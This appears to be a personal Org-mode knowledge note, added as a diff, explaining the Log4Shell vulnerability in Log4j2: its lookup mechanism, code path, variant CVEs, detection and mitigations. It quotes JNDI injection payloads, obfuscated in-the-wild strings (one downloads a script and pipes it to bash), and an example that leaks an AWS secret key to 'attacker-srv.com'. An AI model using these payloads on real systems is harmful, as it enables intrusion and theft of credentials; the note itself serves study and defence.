@@ -1,0 +1,161 @@
+:PROPERTIES:
+:ID:       7f20270f-cd0c-4412-8fe7-ad3da4ccfba6
+:END:
+#+title: Log4Shell
+#+filetags: :Cybersecurity:java:
+
+* Overview
+Log4Shell (CVE-2021-44228, CVE-2021-45046, CVE-2021-45105, CVE-2021-44832) is an RCE vulnerability found in [[id:149c73de-c5b0-4a9b-b79f-61834b011309][Apache Log4j2]]. The RCE happens after logging a certain string (more on that later).
+
+The impact of this exploit is massive, this is because the library in question is widely used, and it mainly runs on backend servers.
+
+Some of the affected are: Steam, Apple iCloud, Minecraft and many more.
+
+The flaw is caused by a feautre called message lookup substitution. When enabled (which it was by default), Log4j would detect strings referencing JNDI resources in configuration sources, log messages, and parameters passed by applications. Since no URL santization is done, malicious requests to applications contianing message substitution strings in fields containing a URL for a malicious server.
+
+A high level explanation of how the exploits work is as follows:
+1. An attacker inserts the JNDI lookup in a header field (or message) that is likely to be logged.
+   #+begin_src java
+    log.info("${jndi:ldap://patch.log4shell.com:1389/a}")
+   #+end_src
+2. The string is passed to log4j for logging on the vulnerable web server.
+3. A "Message Lookup" is parsed by Log4j to be interpreted.
+4. The LDAP server is queried via the URI
+5. The response is downloaded and passed to the JNDI Manager
+6. The JNDI Manager loads and deserializes the response data as Java bytecode into the Java process.
+7. When loading the Java code, the ~getObjectInstance~ method is called since the loaded class is an ~ObjectFactory~ (alternatively, the payload code can be wrapped in a static context with static ~{}~ which will be triggered upon loading the class).
+8. The attacker's code is executed on the server.
+
+* In Depth Analysis
+Log4Shell is an explot of Log4j's message substitution feature, which allowed for programattic modification of event logs by inserting strings that call for external content. The code allowed for lookups to happen using the JNDI URLs.
+
+An attacker can insert text with embedded malicious JNDI URLs into requests to software using Log4j, that resulted in remote code being loaded and executed by the logger. The Java code that is ran by Log4j will inherit the permessions given to the Java runtime.
+
+** Exploit requirements
+- A server with a vulnerable log4j version (log4j1 or log4j version <= 2.16.0).
+- An endpoint with any protocol (HTTP for example) that allows an attacker to send the exploit string.
+- A log statement that logs out the string from that request.
+
+As an example, to exploit the vulnerability, an attacker could construct a JNDI query in the User-Agent HTTP Header:
+#+begin_example
+User-Agent: ${jndi:ldap://<host>:<port>/<path>}
+#+end_example
+
+JNDI has logic that detects when a directory object contains a Java object and loads it into memory. The LDAP object loader will retrieve the contents of the URL defined in javaCodebase and use it to create an object in memory, If the LDAP object has ~ObjectClass~ attribute defined as ~javaNamingReference~ and has the attributes ~javaCodebase~, ~javaFactory~, and ~javaClassName~. This class' initialization method (constructor) is called and loads untrusted code from an untrusted source.
+
+** Causing A Lookup
+Since Log4j outputs logging events using TTCCLayout, we can provide a message to be logged via ~%m~ tag. ~%m~ is for application supplied messages associated with the event.
+
+The vulnerability can be exploited when the logging function (error, info, etc) is called with a message parameter that includes JNDI URL (dns, ldap, rmi). This is when the lookup will happen.
+
+By default, all requests are done using the prefix ~java:comp/env/~; however, the authors implemented the option of using a custom prefix by means of a colon symbol in the key. This is where the vulnerability lies: if ~jndi:ldap://~ is used as the key, the request goes to the specified ldap server (or any other protocol).
+
+When passed to Log4j, lookup commands using JNDI result in Log4j reaching out to a server to fetch Java code. The intended way was to have the code at the remote location help build the log message, but the same mechanism allows for execution of unvetted, malicious, remote Java code.
+
+** From Logging to RCE
+After calling ~logger.error()~ for example, a chain of method calls begins. The chain starts with ~logMessage~ and ends with ~lookup~ (when using ldap).
+
+The ~logMessage~ call will be followed with several calls to construct the message to be logged. The message will get appended to the log by ~append~ method from ~AbstractOutputStreamAppender~ class.
+
+This in turns calls ~directEncodeEvent~ method, which calls the ~getLayout().Encode~ method which formats the log message and adds the provided parameter (the exploit URL). The log is transformed into a string using the ~StringBuilder~ method call. This call uses the ~format~ method from ~MessagePatternConvert~ class and parses the supplied URL, it looks for ~$~ and ~{~ to identify the URL (if it needs to do lookups).
+
+After that it tries to identify various ~Name~ and variable values which are seperated by ~:~ or ~-~ . A call to ~resolveVariable~ method from ~StrSubstitutor~ class is made which identifies the correct variable to use (date, java, marker, ..., jndi)
+
+Finally, the ~lookup~ method is called from the ~Interpolator~ class which will check the service associated with the variable, and the calls the ~lookup~ method from the appropriate variable manager (in this case ~jndiManager~). A request is made after calling ~getURLOrDefaultInitCtx~ method from ~InitialContext~ class, which is where it creats the request that will be sent to the JNDI interface to retrieve context, depending on the URL provided.
+
+If the URL contains ldap, then another method is called which will connect with the ldap provided. After some calls, the ~flashBuffer~ method is called which will execute the data returned from the ldap server after deserializing it.
+** Analiysis of Attacks
+Noteworthy examples can be seen below:
+#+begin_example
+${jndi%3aldap%3a//0ky8rj5089x9qx7tq8djb3rpp.canarytokens[.]com/a}
+${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName:user:env}.c6340b92vtc00002scfggdpcz9eyyyyyd.interactsh[.]com}
+${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160[.]149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC80NS41Ni45Mi4yMjk6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvNDUuNTYuOTIuMjI5OjgwKXxiYXNo}
+${jndi:ldap://5819.u837r4g5oolsy8hudoz24c15nwtohd.burpcollaborator[.]net/a}
+${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//62.182.80.168:1389/pien3m}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}${lower:d}${lower:a}${lower:p}}://67.205.191.102:1389/koejir}}
+#+end_example
+
+Attackers tried to insert the payload in uncommon fields, such as User-Agent, the data field, and the URI parameter.
+
+These blocks can be nested and merged. It allows for countless complicated obfuscation techniques that can be used. For example, attacker can use ~${${lower:jn}${lower:di}}~ instead of ~${jndi:}~.
+
+Using a string such as ~${jndi:dns://dnsserver.com/somedomain}~ will cause the victim to send a DNS query to dnsserver.com, querying about the somedomain DNS record. This can be used to detect vulnerable Log4j instances, tunnel back data, or even as a DDoS attack.
+
+Some secret environment variables can be leaked using any protocols. For example, ~${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.attacker-srv.com/foo}~, may leak the machine's secret AWS access key.
+
+* Vulnerabilty Versions
+- CVE-2021-44228
+  This is the original exploit. It allows for RCE using the lookup functionality.
+- CVE-2021-45046
+  Allows attackers to craft malicuous input data that could cause an information leak or RCE.
+
+  It is related to Thread Context functionality. It allows a programmer to assign values for multiple attributes at once and the substute them in messages using special syntax. If a product use non-default Patter Layout with a Context Lookup, for example, ~${ctx:username}~, then an attacker that controls this username can do a recursive lookup that leads to stack overflow error and cause a DoS attack at best and RCE at worse. The mitigation related to ~formatMsgNoLookups~ don't prevent this issue.
+
+  The conditions for the exploitation of this version are:
+  1. A new (non-defualt) pattern layout must be added to the Log4j configuration file. The pattern layout must use a Context Lookup ~${ctx:}~. An example of a vulnerable config:
+     #+begin_example
+    # vulnerable in 2.14.1 even with ENV LOG4J_FORMAT_MSG_NO_LOOKUPS true
+    appender.console.layout.pattern = ${ctx:useragent} - %d{yyyy-MM-dd HH:mm:ss} %-5p %c{1}:%L - %m%n
+     #+end_example
+
+  2. The vulnerable application must use a Thread Context Map where the attacker has control of the input data, for example:
+     #+begin_src java
+    public void handle(HttpExchange he) throws IOException {
+        // userAgent is attacker-controlled
+        String userAgent = he.getRequestHeader("User-Agent");
+
+        // Note that 1st argument matches the variable name from the configured pattern
+        ThreadContext.put("useragent", userAgent);
+
+        // The log message itself doesn't need to contain any message lookup
+        log.info("Received a request with User-Agent");
+        ...
+     #+end_src
+
+- CVE-2021-44832
+  Allows the attacker to do DOS attack by causeing an infinite recursion loop on self-referential lookups.
+* Identifying Vulnerable Servers
+The simplest way to detect if a remote endpoint is vulnerable is to trigger a DNS query. The exploit will cause the vulnerable server to attempt to fetch some remote code. By using the address of a free online DNS logging tool in the exploit string, we can detect when the vulnerability is triggered.
+
+* Mitigation
+** Updateing to 2.17.0
+All of this was possbile because JNDI support was not restricted in terms of what names could be resolved. Some protocols were unsafe or can allow RCE. version 2.15.0 restricted JNDI to only LDAP lookups, and those lookups are limited to connecting to Java primitve objects on the local host by default.
+
+But the fix left the vulnerability partially unresolved, it was still possible to craft malicious input data using a JNDI lookup pattern resulting in a DOS attack.
+
+New version is released that fixes the Log4Shell vulnerability as of version 2.17.0. This version disables JNDI by default and removes the message lookup feature.
+
+** Enable formatMsgNoLookups
+This can be done when configuring log4j by preforming on of the following:
+- Pass as a JVM flag - When invoking java we can set this flag. ~java -Dlog4j2.formatMsgNoLookups=true ...~
+- Set Environment Variable - This feature may be set via environment variable. ~LOG4J_FORMAT_MSG_NO_LOOKUPS=true java ...~
+- Using the JVM arguemnts environment variable. ~JAVA_OPTS=-Dlog4j2.formatMsgNoLookups=true~.
+- Modify every logging pattern (in every config file) to say ~%m{nolookups}~ instead of ~%m~.
+
+** JNDI patch
+One possibility is to to prevent the ~JndiLookup.class~ file from being loaded in the application's classpath. This can be done by deleting the class from affected JAR files. One must alos take a look at other libraries to make sure that none is using Log4j as a shaded library.
+
+Subtitue a non-vulnerable or empty implementation of the class ~org.apache.logging.log4j.core.lookup.JndiLookup~ in a way that your classloader uses the replacement instead of the vulnerable version of the class.
+
+This can be done by injecting a Java agent into a running JVM process. The agent should attempt to patch the ~lookup()~ method of all loaded instances of ~JndiLookup~ to unconditionally return the string ~Patched JndiLookup::lookup()~. For this to work, the target JVM should be ran with ~-XX:+DisableAttachMechanism~ turned off.
+
+Kubernetes administrators may use `kubectl set env` to set the ~LOG4J_FORMAT_MSG_NO_LOOKUPS=true~ environment variable to apply mitigation across [[id:a00327a6-e4ba-4669-bf55-2d39ee118acc][Kubernetes]] clusters.
+** Update Java Version
+Some Java versions set the JVM property ~com.sun.jndi.ldap.object.trustURLCodebase~ to false by default, which disables JNDI loading of classes from arbitrary URL code bases.
+** WAF Will Not Save You From Log4Shell
+Since attackes can be nested, no specif rule can be used to filter out malicious requests.
+
+* Resources
+- LiveOverflow's two part series ([[https://www.youtube.com/watch?v=w2F67LbEtnk][1]], [[https://www.youtube.com/watch?v=iI9Dz3zN4d8][2]])
+- John Hammond's [[https://www.youtube.com/watch?v=7qoPDq41xhQ][video]] about Log4Shell
+- lunasec series of articles ([[https://www.lunasec.io/docs/blog/log4j-zero-day/][1]],[[https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/][2]],[[https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046/][3]],[[https://www.lunasec.io/docs/blog/log4shell-live-patch/][4]],[[https://www.lunasec.io/docs/blog/log4shell-live-patch-technical/][5]])
+- Log4j hotpatch Github [[https://github.com/corretto/hotpatch-for-apache-log4j2][repo]]
+- sophos series of articles ([[https://news.sophos.com/en-us/2021/12/12/log4shell-hell-anatomy-of-an-exploit-outbreak/][1]],[[https://news.sophos.com/en-us/2021/12/17/inside-the-code-how-the-log4shell-exploit-works/][2]],[[https://news.sophos.com/en-us/2021/12/17/log4shell-response-and-mitigation-recommendations/][3]])
+- Interactsh tool Github [[https://github.com/projectdiscovery/interactsh][repo]]
+- dynatrace's [[https://www.dynatrace.com/news/blog/what-is-log4shell/][article]] about Log4Shell
+- Microsoft's [[https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2/][article]] about Log4Shell
+- securelist's [[https://securelist.com/cve-2021-44228-vulnerability-in-apache-log4j-library/105210/][article]] about Log4Shell
+- Logout4Shell Github [[https://github.com/Cybereason/Logout4Shell][repo]]
+- jfrog's [[https://jfrog.com/blog/the-jndi-strikes-back-unauthenticated-rce-in-h2-database-console/][article]] about RCE in H2
+- jfrog's [[https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/#toctou-bypass][article]] about Log4Shell
+- Log4j Bypass words Github [[https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words][repo]]
